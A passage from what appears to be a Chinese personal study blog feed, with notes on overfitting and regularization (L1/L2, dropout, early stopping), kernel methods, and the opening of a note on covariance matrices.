        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/72038532#:~:text=%E5%AF%B9%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%88%96%E6%9C%BA%E5%99%A8,%E7%A7%B0%E4%B8%BA%E6%B3%9B%E5%8C%96%E8%AF%AF%E5%B7%AE%E3%80%82">欠拟合、过拟合及如何防止过拟合 - 知乎</a></p><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>对于深度学习或机器学习模型而言，我们不仅要求它对训练数据集有很好的拟合（训练误差），同时也希望它可以对未知数据集（测试集）有很好的拟合结果（泛化能力），所产生的测试误差被称为泛化误差。度量泛化能力的好坏，最直观的表现就是模型的过拟合（overfitting）和欠拟合（underfitting）。过拟合和欠拟合是用于描述模型在训练过程中的两种状态。一般来说，训练过程会是如下所示的一个曲线图。</p><p><img src="http://files.shanqianche.cn/2021531/1622461280602.png" alt="训练过程"></p><p>训练刚开始的时候，模型还在学习过程中，处于欠拟合区域。随着训练的进行，训练误差和测试误差都下降。在到达一个临界点之后，训练集的误差下降，测试集的误差上升了，这个时候就进入了过拟合区域——由于训练出来的网络过度拟合了训练集，对训练集以外的数据却不有效。</p><p><img src="http://files.shanqianche.cn/2021531/1622461630220.png" alt="拟合"></p><h2 id="欠拟合"><a href="#欠拟合" class="headerlink" title="欠拟合"></a>欠拟合</h2><p><font color="#9932CC">欠拟合</font>是指模型不能在训练集上获得足够低的误差。换句换说，就是模型复杂度低，模型在训练集上就表现很差，没法学习到数据背后的规律。</p><p><img src="http://files.shanqianche.cn/2021531/1622461604985.png" alt="欠拟合"></p><p><strong>如何解决欠拟合？</strong></p><p>欠拟合基本上都会发生在训练刚开始的时候，经过不断训练之后欠拟合应该不怎么考虑了。但是如果真的还是存在的话，可以通过<font color="#7FFF00">增加网络复杂度</font>或者在模型中<font color="#7FFF00">增加特征</font>，这些都是很好解决欠拟合的方法。</p><h2 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h2><p><font color="#9932CC">过拟合</font>是指训练误差和测试误差之间的差距太大。换句换说，就是模型复杂度高于实际问题，<font color="#ff7500">模型在训练集上表现很好，但在测试集上却表现很差。</font>模型对训练集”死记硬背”（记住了不适用于测试集的训练集性质或特点），没有理解数据背后的规律，泛化能力差。</p><p><img src="http://files.shanqianche.cn/2021531/1622461615228.png" alt="过拟合"></p><p><font color="#FF1493">出现原因</font></p><ol><li><strong>训练数据集样本单一，样本不足。</strong> 如果训练样本只有负样本，然后那生成的模型去预测正样本，这肯定预测不准。所以训练样本要尽可能的全面，覆盖所有的数据类型。</li><li><strong>训练数据中噪声干扰过大。</strong> 噪声指训练数据中的干扰数据。过多的干扰会导致记录了很多噪声特征，忽略了真实输入和输出之间的关系。</li><li><strong>模型过于复杂</strong>。模型太复杂，已经能够“死记硬背”记下了训练数据的信息，但是遇到没有见过的数据的时候不能够变通，泛化能力太差。我们希望模型对不同的模型都有稳定的输出。模型太复杂是过拟合的重要因素。</li></ol><p><strong><font color="#FF8C00">如何防止过拟合</font></strong><br>要想解决过拟合问题，就要显著减少测试误差而不过度增加训练误差，从而提高模型的泛化能力。我们可以使用正则化（Regularization）方法。</p><blockquote><p>正则化是指修改学习算法，使其降低泛化误差而非训练误差。</p></blockquote><h3 id="正则化方法"><a href="#正则化方法" class="headerlink" title="正则化方法"></a>正则化方法</h3><blockquote><p>常用的正则化方法根据具体的使用<font color="#D2691E">策略</font>不同可分为：<br>（1）直接提供正则化约束的参数正则化方法，如L1/L2正则化；<br>（2）通过工程上的技巧来实现更低泛化误差的方法，如提前终止(Early stopping)和Dropout；<br>（3）不直接提供约束的隐式正则化方法，如数据增强等。</p></blockquote><ol><li> 获取和使用更多的数据（数据集增强）——解决过拟合的<font color="#DC143C">根本性</font>方法</li></ol><p>让机器学习或深度学习模型泛化能力更好的办法就是使用更多的数据进行训练。但是，在实践中，我们拥有的数据量是有限的。解决这个问题的一种方法就是<font color="#7FFF00">创建“假数据”并添加到训练集中——数据集增强</font>。通过增加训练集的额外副本来增加训练集的大小，进而改进模型的泛化能力。</p><ol start="2"><li>采用合适的模型（控制模型的复杂度）</li></ol><p>过于复杂的模型会带来过拟合问题。对于模型的设计，目前公认的一个深度学习规律”deeper is better”。国内外各种大牛通过实验和竞赛发现，对于CNN来说，层数越多效果越好，但是也更容易产生过拟合，并且计算所耗费的时间也越长。</p><p>根据<font color="#E9967A">奥卡姆剃刀</font>法则：在同样能够解释已知观测现象的假设中，我们应该挑选“最简单”的那一个。对于模型的设计而言，我们应该选择简单、合适的模型解决复杂的问题。</p><ol start="3"><li>降低特征的数量</li></ol><p>对于一些特征工程而言，可以降低特征的数量——<font color="#006400">删除冗余特征</font>，人工选择保留哪些特征。这种方法也可以解决过拟合问题。</p><ol start="4"><li>L1 / L2 正则化</li></ol><p><a href="https://www.cnblogs.com/zingp/p/10375691.html#_label0">深入理解L1、L2正则化 - ZingpLiu - 博客园</a></p><ul><li>L1正则化</li></ul><p>L1正则化可以使得参数稀疏化，即得到的参数是一个稀疏矩阵，可以用于特征选择。</p><pre><code>    稀疏性，说白了就是模型的很多参数是0。通常机器学习中特征数量很多，例如文本处理时，如果将一个词组（term）作为一个特征，那么特征数量会达到上万个（bigram）。在预测或分类时，那么多特征显然难以选择，但是如果代入这些特征得到的模型是一个稀疏模型，很多参数是0，表示只有少数特征对这个模型有贡献，绝大部分特征是没有贡献的，即使去掉对模型也没有什么影响，此时我们就可以只</code></pre><p>在原始的损失函数后面加上一个L1正则化项，即<strong>全部权重 $w$ 的绝对值的和，再乘以λ/n</strong>。则损失函数变为：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo>=</mo><msub><mi>C</mi><mn>0</mn></msub><mo>+</mo><mfrac><mi>&#x3BB;</mi><mi>n</mi></mfrac><munder><mo>&#x2211;</mo><mi>i</mi></munder><mfenced close="|" open="|"><msub><mi>w</mi><mi>i</mi></msub></mfenced></math></p><p>对应的梯度（导数）：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mo>&#x2202;</mo><mi>C</mi></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mo>&#x2202;</mo><msub><mi>C</mi><mn>0</mn></msub></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac><mo>+</mo><mfrac><mi>&#x3BB;</mi><mi>n</mi></mfrac><mo>sgn</mo><mo>(</mo><mi>w</mi><mo>)</mo></math></p><p>其中 <math xmlns="http://www.w3.org/1998/Math/MathML"><mo>sgn</mo><mo>(</mo><mi>w</mi><mo>)</mo></math> 只是简单地取 $w1$ 各个元素地正负号。</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mo>sgn</mo><mo>(</mo><mi>w</mi><mo>)</mo><mo>=</mo><mfenced close="" open="{"><mtable columnalign="left"><mtr><mtd><mn>1</mn><mo>,</mo><mi>w</mi><mo>&gt;</mo><mn>0</mn></mtd></mtr><mtr><mtd><mn>0</mn><mo>,</mo><mi>w</mi><mo>=</mo><mn>0</mn></mtd></mtr><mtr><mtd><mo>-</mo><mn>1</mn><mo>,</mo><mi>w</mi><mo>&lt;</mo><mn>0</mn></mtd></mtr></mtable></mfenced></math></p><p>梯度下降时权重 $w$ 更新变为：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>w</mi><mo>&#x2192;</mo><msup><mi>w</mi><mo>‘</mo></msup><mo>=</mo><mi>w</mi><mo>-</mo><mfrac><mrow><mi>&#x3B7;</mi><mi>&#x3BB;</mi></mrow><mi>n</mi></mfrac><mo>sgn</mo><mo>(</mo><mi>w</mi><mo>)</mo><mo>-</mo><mi>&#x3B7;</mi><mfrac><mrow><mo>&#x2202;</mo><msub><mi>C</mi><mn>0</mn></msub></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac></math></p><p>当 $w=0$ 时，|w|是不可导的。所以我们仅仅能依照原始的未经正则化的方法去更新 $w$  。<br>当 $w&gt;0$  时，sgn( $w$  )&gt;0, 则梯度下降时更新后的 $w$  变小。<br>当 $w&lt;0$  时，sgn( $w$  )&gt;0, 则梯度下降时更新后的 $w$  变大。换句换说，L1正则化使得权重 $w$ 往0靠，使网络中的权重尽可能为0，也就相当于减小了网络复杂度，防止过拟合。</p><p>这也就是<font color="#6495ED">L1正则化会产生更稀疏（sparse）的解</font>的原因。此处稀疏性指的是最优值中的一些参数为0。<font color="#1E90FF">L1正则化的稀疏性质已经被广泛地应用于特征选择</font>机制，从可用的特征子集中选择出有意义的特征。</p><ul><li>L2 正则化</li></ul><p>L2正则化可以防止模型过拟合（overfitting）；一定程度上，L1也可以防止过拟合。</p><p>拟合过程中通常都倾向于让权值尽可能小，最后构造一个所有参数都比较小的模型。因为一般认为参数值小的模型比较简单，能适应不同的数据集，也在一定程度上避免了过拟合现象。可以设想一下对于一个线性回归方程，若参数很大，那么只要数据偏移一点点，就会对结果造成很大的影响；但如果参数足够小，数据偏移得多一点也不会对结果造成什么影响，专业一点的说法是抗扰动能力强。</p><p>L2正则化通常被称为<strong>权重衰减</strong>（weight decay），就是在原始的损失函数后面再加上一个L2正则化项，即<strong>全部权重</strong> $w$  的平方和，再乘以λ/2n。则损失函数变为：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo>=</mo><msub><mi>C</mi><mn>0</mn></msub><mo>+</mo><mfrac><mi>&#x3BB;</mi><mrow><mn>2</mn><mi>n</mi></mrow></mfrac><mo>&#xB7;</mo><mo>&#x2211;</mo><msubsup><mi>w</mi><mi>i</mi><mn>2</mn></msubsup></math></p><p>对应的梯度（导数）：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mo>&#x2202;</mo><mi>C</mi></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mo>&#x2202;</mo><msub><mi>C</mi><mn>0</mn></msub></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac><mo>+</mo><mfrac><mi>&#x3BB;</mi><mi>n</mi></mfrac><mi>w</mi></math></p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mfrac><mrow><mo>&#x2202;</mo><mi>C</mi></mrow><mrow><mo>&#x2202;</mo><mi>b</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mo>&#x2202;</mo><msub><mi>C</mi><mn>0</mn></msub></mrow><mrow><mo>&#x2202;</mo><mi>b</mi></mrow></mfrac></math></p><p>能够发现L2正则化项对偏置 b 的更新没有影响，可是对于权重 $w$  的更新有影响：</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>w</mi><mo>&#x2192;</mo><mi>w</mi><mo>-</mo><mi>&#x3B7;</mi><mfrac><mrow><mo>&#x2202;</mo><msub><mi>C</mi><mn>0</mn></msub></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac><mo>-</mo><mfrac><mrow><mi>&#x3B7;</mi><mi>&#x3BB;</mi></mrow><mi>n</mi></mfrac><mi>w</mi></math><br><math xmlns="http://www.w3.org/1998/Math/MathML"><mo>=</mo><mfenced><mrow><mn>1</mn><mo>-</mo><mfrac><mrow><mi>&#x3B7;</mi><mi>&#x3BB;</mi></mrow><mi>n</mi></mfrac></mrow></mfenced><mi>w</mi><mo>-</mo><mi>&#x3B7;</mi><mfrac><mrow><mo>&#x2202;</mo><msub><mi>C</mi><mn>0</mn></msub></mrow><mrow><mo>&#x2202;</mo><mi>w</mi></mrow></mfrac></math><br>这里的<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3B7;</mi></math>、 $n$ 、<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3BB;</mi></math>都是大于0的， 所以 <math xmlns="http://www.w3.org/1998/Math/MathML"><mn>1</mn><mo>-</mo><mfrac><mrow><mi>&#x3B7;</mi><mi>&#x3BB;</mi></mrow><mi>n</mi></mfrac></math>小于1。因此在梯度下降过程中，权重 $w$ 将逐渐减小，趋向于0但不等于0。这也就是<strong>权重衰减</strong>（weight decay）的由来。</p><p>L2正则化起到使得权重参数 $w$ 变小的效果，为什么能防止过拟合呢？因为更小的权重参数  意味着模型的复杂度更低，对训练数据的拟合刚刚好，不会过分拟合训练数据，从而提高模型的泛化能力。</p><ol start="5"><li>Dropout</li></ol><p>  Dropout是在训练网络时用的一种技巧（trike），相当于在隐藏单元增加了噪声。<strong>Dropout 指的是在训练过程中每次按一定的概率（比如50%）随机地“删除”一部分隐藏单元（神经元）</strong>。所谓的“删除”不是真正意义上的删除，其实就是将该部分神经元的激活函数设为0（激活函数的输出为0），让这些神经元不计算而已。</p><p>  <img src="http://files.shanqianche.cn/2021531/1622466578527.png" alt="Dropout"></p><p><font color="#006400">  <strong>Dropout为什么有助于防止过拟合呢？</strong></font></p><p>（a）在训练过程中会产生不同的训练模型，不同的训练模型也会产生不同的的计算结果。随着训练的不断进行，计算结果会在一个范围内波动，但是均值却不会有很大变化，因此可以把最终的训练结果看作是不同模型的平均输出。<br>（b）它消除或者减弱了神经元节点间的联合，降低了网络对单个神经元的依赖，从而增强了泛化能力。</p><blockquote><p><font color="#00008B">理解</font><br>通过加入噪声，在训练模型时，扩展模型的接受范围，避免过拟合</p></blockquote><ol start="6"><li>Early stopping（提前终止）</li></ol><p>对模型进行训练的过程即是对模型的参数进行学习更新的过程，这个参数学习的过程往往会用到一些迭代方法，如梯度下降（Gradient descent）。Early stopping是一种迭代次数截断的方法来防止过拟合的方法，<font color="#7FFF00">即在模型对训练数据集迭代收敛之前停止迭代来防止过拟合</font>。</p><p>为了获得性能良好的神经网络，训练过程中可能会经过很多次epoch（遍历整个数据集的次数，一次为一个epoch）。如果epoch数量太少，网络有可能发生欠拟合；如果epoch数量太多，则有可能发生过拟合。Early stopping旨在解决epoch数量需要手动设置的问题。具体做法：每个epoch（或每N个epoch）结束后，在验证集上获取测试结果，随着epoch的增加，如果在验证集上发现测试误差上升，则停止训练，将停止之后的权重作为网络的最终参数。</p><p><font color="#E9967A">为什么能防止过拟合？</font></p><p>当还未在神经网络运行太多迭代过程的时候，w参数[误差]接近于0，因为随机初始化w值的时候，它的值是较小的随机值。当你开始迭代过程，w的值会变得越来越大。到后面时，w的值已经变得十分大了。所以early stopping要做的就是在中间点停止迭代过程。我们将会得到一个中等大小的w参数，会得到与L2正则化相似的结果，选择了w参数较小的神经网络。</p><p><font color="#A52A2A">Early Stopping缺点</font><br><strong>没有采取不同的方式来解决优化损失函数和过拟合这两个问题</strong>，而是用一种方法同时解决两个问题 ，结果就是要考虑的东西变得更复杂。之所以不能独立地处理，因为如果你停止了优化损失函数，你可能会发现损失函数的值不够小，同时你又不希望过拟合。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> machine learning </tag>
            
            <tag> data mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernal</title>
      <link href="/2021/05/30/kernal/"/>
      <url>/2021/05/30/kernal/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><font color="#6495ED">核方法</font>是一类把低维空间的非线性可分问题，转化为高维空间的线性可分问题的方法。</p><blockquote><p><font color="#A9A9A9">理论基础:</font>核方法的理论基础是Cover’s theorem，指的是<font color="#FF8C00">对于非线性可分的训练集，可以大概率通过将其非线性映射到一个高维空间来转化成线性可分的训练集。</font></p></blockquote><p><font color="#9400D3">核函数</font>是映射关系 的内积，映射函数本身仅仅是一种映射关系，并没有增加维度的特性，不过可以利用核函数的特性，构造可以增加维度的核函数。</p><p>设 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="script">X</mi></math>是输入空间（即 <math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>x</mi><mi>i</mi></msub><mo>&#x2208;</mo><mi mathvariant="script">X</mi></math> ， <math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="script">X</mi></math>  是 <math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi mathvariant="normal">&#x211D;</mi><mi>n</mi></msup></math> 的子集或离散集合 ），又设<math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="script">H</mi></math>  为特征空间（<math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="script">H</mi></math> 是希尔伯特空间），如果存在一个从 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="script">X</mi></math> 到 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="script">H</mi></math> 的映射</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3D5;</mi><mo>(</mo><mi>x</mi><mo>)</mo><mo>:</mo><mi mathvariant="script">X</mi><mo>&#x2192;</mo><mi mathvariant="script">H</mi></math></p><p>使得对所有 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><mo>,</mo><mi>z</mi><mo>&#x2208;</mo><mi mathvariant="script">X</mi></math>,函数<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi><mo>(</mo><mi>x</mi><mo>,</mo><mi>z</mi><mo>)</mo></math>满足条件</p><p><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi><mo>(</mo><mi>x</mi><mo>,</mo><mi>z</mi><mo>)</mo><mo>=</mo><mo>&#x27E8;</mo><mi>&#x3D5;</mi><mo>(</mo><mi>x</mi><mo>)</mo><mo>,</mo><mi>&#x3D5;</mi><mo>(</mo><mi>z</mi><mo>)</mo><mo>&#x27E9;</mo></math></p><p>则称 $K$ 为核函数。其中 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3D5;</mi><mo>(</mo><mi>x</mi><mo>)</mo></math> 为映射函数， <math xmlns="http://www.w3.org/1998/Math/MathML"><mo>&#x27E8;</mo><mo>&#xB7;</mo><mo>,</mo><mo>&#xB7;</mo><mo>&#x27E9;</mo></math>为内积。</p><p>即核函数输入两个向量，它返回的值<font color="#FF1493">等于</font>这两个向量分别作 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3D5;</mi></math> 映射然后点积【内积】的结果。</p><p><font color="#008B8B">核技巧</font>是一种利用核函数直接计算 <math xmlns="http://www.w3.org/1998/Math/MathML"><mo>&#x27E8;</mo><mi>&#x3D5;</mi><mo>(</mo><mi>x</mi><mo>)</mo><mo>,</mo><mi>&#x3D5;</mi><mo>(</mo><mi>z</mi><mo>)</mo><mo>&#x27E9;</mo></math> ，以避开分别计算<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3D5;</mi><mo>(</mo><mi>x</mi><mo>)</mo></math>  和<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3D5;</mi><mo>(</mo><mi>z</mi><mo>)</mo></math>  ，从而加速核方法计算的技巧。</p><blockquote><p><font color="#FF1493">注意</font><br>得益于<font color="#FF8C00">SVM对偶问题</font>的表现形式，核技巧可以应用于SVM。<br><font color="#7FFF00">TODO  </font>没有了解<br>核函数的选择是SVM的<font color="#B8860B">最大变数</font>，如果核函数选择不适，那么  将不能将输入空间映射到线性可分的特征空间。</p></blockquote><h2 id="判断核函数"><a href="#判断核函数" class="headerlink" title="判断核函数"></a>判断核函数</h2><p><font color="#bf242a">不知道 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>&#x3D5;</mi></math> 的情况下，如何判断某个 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi></math> 是不是核函数？</font></p><p><strong>答案:</strong> 是 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi></math> 是核函数当且仅当对任意数据 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>D</mi><mo>=</mo><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>x</mi><mn>2</mn></msub><mo>,</mo><mo>&#x2026;</mo><mo>,</mo><msub><mi>x</mi><mi>m</mi></msub></math> ，核矩阵(kernal matrix,gram matrix)总是半正定的</p><blockquote><p><font color="#368AF8">知识补充：</font><strong>实对称矩阵</strong><br>如果有n阶矩阵A，其矩阵的元素都为实数，且矩阵A的转置等于其本身（aij=aji），(i,j为元素的脚标），则称A为实对称矩阵。</p></blockquote><blockquote><p><font color="#6495ED"><a href="https://zhuanlan.zhihu.com/p/44860862">知识补充</a>：</font><font color="#8B0000">「正定矩阵」(positive definite)</font>和<font color="#8B0000">「半正定矩阵」(positive semi-definite)</font><br><strong>正定矩阵：</strong> 给定一个大小为 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>n</mi><mo>&#xD7;</mo><mi>n</mi></math> 的实对称矩阵<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>A</mi></math>  ，若对于任意长度为 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>n</mi></math> 的<font color="#A66766">非零向量</font> <math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="bold-italic">x</mi></math>，有 <math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi mathvariant="bold-italic">x</mi><mi>T</mi></msup><mi>A</mi><mi mathvariant="bold-italic">x</mi><mo>&gt;</mo><mn>0</mn></math> 恒成立，则矩阵 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>A</mi></math>  是一个正定矩阵。<br><strong>半正定矩阵：</strong> 给定一个大小为 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>n</mi><mo>&#xD7;</mo><mi>n</mi></math> 的实对称矩阵<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>A</mi></math>  ，若对于任意长度为 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>n</mi></math> 的<font color="#A66766">向量</font> <math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="bold-italic">x</mi></math>，有 <math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi mathvariant="bold-italic">x</mi><mi>T</mi></msup><mi>A</mi><mi mathvariant="bold-italic">x</mi><mo>&gt;</mo><mn>0</mn></math> 恒成立，则矩阵 <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>A</mi></math>  是一个正定矩阵。<br><font color="#FF00FF">半正定矩阵包括了正定矩阵，核矩阵与协方差矩阵都要半正定</font></p></blockquote><p><img src="http://files.shanqianche.cn/2021530/1622369097125.png" alt="核矩阵"></p><h2 id="常用核函数"><a href="#常用核函数" class="headerlink" title="常用核函数"></a>常用核函数</h2><p><img src="http://files.shanqianche.cn/2021530/1622366953315.png" alt="常用核函数"></p><h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>举一个<a href="https://zhuanlan.zhihu.com/p/95362628">栗子</a><br>下面这张图位于第一、二象限内。我们关注红色的门，以及“北京四合院”这几个字下面的紫色的字母。我们把红色的门上的点看成是“+”数据，紫色字母上的点看成是“-”数据，它们的横、纵坐标是两个特征。显然，在这个二维空间内，“+”“-”两类数据不是线性可分的。</p><p><img src="http://files.shanqianche.cn/2021530/1622369536767.png" alt="二维"></p><p>我们现在考虑核函数<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>K</mi><mfenced><mrow><msub><mi>v</mi><mn>1</mn></msub><mo>,</mo><msub><mi>v</mi><mn>2</mn></msub></mrow></mfenced><mo>=</mo><mo>&lt;</mo><msub><mi>v</mi><mn>1</mn></msub><mo>,</mo><msub><mi>v</mi><mn>2</mn></msub><msup><mo>&gt;</mo><mn>2</mn></msup></math>，即“内积平方”。<br>这里面<math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>v</mi><mn>1</mn></msub><mo>=</mo><mfenced><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>y</mi><mn>1</mn></msub></mrow></mfenced><mo>,</mo><msub><mi>v</mi><mn>2</mn></msub><mo>=</mo><mfenced><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>,</mo><msub><mi>y</mi><mn>2</mn></msub></mrow></mfenced></math>是二维空间中的两个点。</p><p>这个核函数对应着一个二维空间到三维空间的映射，它的表达式是：<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>P</mi><mo>(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>)</mo><mo>=</mo><mfenced><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>,</mo><msqrt><mn>2</mn></msqrt><mi>x</mi><mi>y</mi><mo>,</mo><msup><mi>y</mi><mn>2</mn></msup></mrow></mfenced></math><br>可以验证，<br><img src="http://files.shanqianche.cn/2021530/1622369667776.png" alt="核函数"></p><p>在P这个映射下，原来二维空间中的图在三维空间中的像是这个样子：</p><p><img src="http://files.shanqianche.cn/2021530/1622369693244.png" alt="三维"></p><p><font color="#D2691E">注意</font>到绿色的平面可以完美地分割红色和紫色，也就是说，两类数据在三维空间中变成线性可分的了。</p><p>而三维中的这个判决边界，再映射回二维空间中是这样的：</p><p><img src="http://files.shanqianche.cn/2021530/1622369730773.png" alt="再二维"></p><p>这是一条双曲线，它不是线性的。</p><p><font color="#A52A2A">通过高维映射使得特征线性可分，换种思路就是当两个特征值无法将数据分开时，就将两个特征值进行点交，形成第三个特征，这个时候就有三个特征值，然后构成三位空间，进行分类</font></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> data mining </tag>
            
            <tag> kernal method </tag>
            
            <tag> kernal trick </tag>
            
            <tag> kernal function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>协方差矩阵</title>
      <link href="/2021/05/26/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5/"/>
      <url>/2021/05/26/%E5%8D%8F%E6%96%B9%E5%B7%AE%E7%9F%A9%E9%98%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="方差和协方差的定义"><a href="#方差和协方差的定义" class="headerlink" title="方差和协方差的定义"></a>方差和协方差的定义</h2><p><font color="#184471"><strong>方差</strong>：</font>用来度量单个随机变量的离散程度</p><p>$$\sigma_{x}^{2}=\frac{1}{n-1} \sum_{i=1}^{n}\left(x_{i}-\bar{x}\right)^{2}$$</p><p><font color="#D3B2F7">为什么样本方差的分母是n-1？</font></p><pre><code>最简单的原因，是因为因为均值已经用了n个数的平均来做估计在求方差时，只有(n-1)个数和均值信息是不相关的。而你的第ｎ个数已经可以由前(n-1)个数和均值　来唯一确定，实际上没有信息量。所以在计算方差时，只除以(n-1)。</code></pre><p><font color="#0C5F6C"><strong>协方差</strong>：</font>一般用来刻画两个随机变量的相似程度</p><p>$$\sigma(x, y)=\frac{1}{n-1} \sum_{i=1}^{n}\left(x_{i}-\bar{x}\right)\left(y_{i}-\bar{y}\right)$$</p><p>在公式中，符号 $\bar{x}, \bar{y}$ 分别表示两个随机变量所对应的观测样本均值，据此，我们发现：方差 $\sigma_{x}^{2}$ 可视作随机变量 x 关于其自身的协方差 $\sigma(x, x)$ .</p><h2 id="从方差-协方差到协方差矩阵"><a href="#从方差-协方差到协方差矩阵" class="headerlink" title="从方差/协方差到协方差矩阵"></a>从方差/协方差到协方差矩阵</h2><p>根据方差的定义，给定 $d$ 个随机变量 $x_{k},k=1,2,\ldots,d$ ，则这些随机变量的方差为<br>$$\sigma\left(x_{k},x_{k}\right)=\frac{1}{n-1}\sum_{i=1}^{n}\left(x_{k i}-\bar{x}_{k}\right)^{2},k=1,2,\ldots,d$$</p><p> $x_{k i}$ 表示随机变量 $x_{k}$ 中的第 $i$ 个观测样本，$n$  表示样本量，每个随机变量所对应的观测样本数量均为 $n$ 。<br> 对于这些随机变量，我们还可以根据协方差的定义，求出<strong>两两之间的协方差</strong>，即<br> <img src="http://files.shanqianche.cn/2021527/1622097407978.png"></p><p> 因此，协方差矩阵为 $$\Sigma=\left[\begin{array}{ccc}\sigma\left(x_{1}, x_{1}\right)&amp;\cdots&amp;\sigma\left(x_{1},x_{d}\right)\\vdots&amp;\ddots&amp;\vdots\\sigma\left(x_{d},x_{1}\right)&amp;\cdots&amp;\sigma\left(x_{d},x_{d}\right)\end{array}\right]\in\mathbb{R}^{d\times d}$$<br>其中，对角线上的元素为各个随机变量的方差，非对角线上的元素为两两随机变量之间的协方差，根据协方差的定义，我们可以认定：矩阵 $\Sigma$ 为<font color="#AB8E35">对称矩阵</font>(symmetric matrix)，其大小为 $d$ x $d$ 。</p><h2 id="多元正态分布与线性变换"><a href="#多元正态分布与线性变换" class="headerlink" title="多元正态分布与线性变换"></a>多元正态分布与线性变换</h2><blockquote><p><font color="#EFED2E">多元正态分布</font>—n维的多元正态分布，也称为多元高斯分布</p></blockquote><p><img src="http://files.shanqianche.cn/2021526/1622033779880.png" alt="多元正态分布图"></p><p>假设一个向量 $x$ 服从均值向量为 $\boldsymbol{\mu}$ 、协方差矩阵为 $\Sigma$ 的多元正态分布(multi-variate Gaussian distribution)【第二章】，则 $$p(\boldsymbol{x})=|2 \pi \Sigma|^{-1 / 2} \exp \left(-\frac{1}{2}(\boldsymbol{x}-\boldsymbol{\mu})^{T} \Sigma^{-1}(\boldsymbol{x}-\boldsymbol{\mu})\right)$$</p><blockquote><p><font color="#DE8937">联立理解：</font>多元正态分布<br><img src="http://files.shanqianche.cn/2021526/1622035698486.png" alt="多元正态分布"></p></blockquote><p>令该分布的均值向量为 $\boldsymbol{\mu}=\mathbf{0}$ ，由于指数项外面的系数 $|2 \pi \Sigma|^{-1 / 2}$ 通常作为常数，故可将多元正态分布简化为 $$p(\boldsymbol{x}) \propto \exp \left(-\frac{1}{2} \boldsymbol{x}^{T} \Sigma^{-1} 